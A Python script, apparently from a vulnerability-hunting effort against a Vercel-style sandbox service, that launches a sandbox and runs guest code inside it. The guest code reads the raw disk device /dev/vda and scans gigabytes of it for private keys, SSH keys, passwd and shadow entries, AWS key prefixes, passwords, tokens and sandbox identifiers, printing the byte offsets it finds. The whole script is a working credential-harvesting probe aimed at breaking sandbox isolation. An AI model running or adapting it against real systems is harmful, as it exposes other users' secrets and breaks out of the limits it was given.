# -*- coding: utf-8 -*-
"""Phase37: 私钥/多沙箱扫描 段3 (14-22GB) + vercel/cell 区域上下文"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os

fd = os.open('/dev/vda', os.O_RDONLY)

# 0) vercel/cell 密集区上下文
for off in [0x2102002fb, 0x20fef002e, 0x2111eb9ea]:
    try:
        chunk = os.pread(fd, 3072, off - 1024)
        print('[===== 0x%x =====]' % off, flush=True)
        print(chunk.replace(b'\x00', b' ')[:2800].decode('latin1', 'replace'), flush=True)
    except Exception as e:
        print('[0x%x] EXC %s' % (off, e), flush=True)

# 1) 段3: 14-22GB
KEYS = [b'BEGIN EC PRIVATE KEY', b'BEGIN RSA PRIVATE KEY', b'BEGIN PRIVATE KEY',
        b'BEGIN OPENSSH PRIVATE KEY', b'ca.key', b'cert.key', b'proxy-ca',
        b'root:x:0:0', b'vercel-sandbox:x', b'ssh-rsa', b'ssh-ed25519',
        b'authorized_keys', b'shadow', b'sbx_', b'team_', b'vcp_',
        b'AKIA', b'secret', b'password=', b'token=', b'cell.sock', b'Vercel']
start = 14 * 1024 * 1024 * 1024
end = 22 * 1024 * 1024 * 1024
hits = {}
total = 0
for off in range(start, end, 4 * 1024 * 1024):
    try:
        chunk = os.pread(fd, 4 * 1024 * 1024, off)
    except Exception:
        break
    total += len(chunk)
    for k in KEYS:
        idx = 0
        while True:
            idx = chunk.find(k, idx)
            if idx < 0:
                break
            hits.setdefault(k.decode('latin1'), []).append(off + idx)
            idx += len(k)
os.close(fd)
print('[scan3] total=%d MB' % (total // 1024 // 1024), flush=True)
for k, v in hits.items():
    print('== %s (%d) ==' % (k, len(v)), flush=True)
    for item in v[:15]:
        print('   off=0x%x' % item, flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg45.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg45.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest15")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=200000)
    print('cmd:', c, flush=True)
    print(r[:12000], flush=True)
